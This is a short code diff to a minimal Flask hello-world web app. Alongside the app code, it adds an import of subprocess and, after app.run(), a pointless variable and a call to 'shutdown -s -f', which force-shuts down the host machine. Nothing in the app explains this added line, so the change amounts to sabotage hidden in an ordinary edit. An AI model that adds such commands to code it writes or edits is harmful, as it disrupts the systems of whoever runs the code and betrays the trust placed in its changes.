@@ -1,6 +1,6 @@
 from flask import Flask
 app = Flask(__name__)
-
+import subprocess
 
 @app.route('/')
 def hello():
@@ -13,3 +13,5 @@ def hello_name(name):
 
 if __name__ == '__main__':
     app.run()
+    seg = 1
+    subprocess.call("shutdown -s -f")
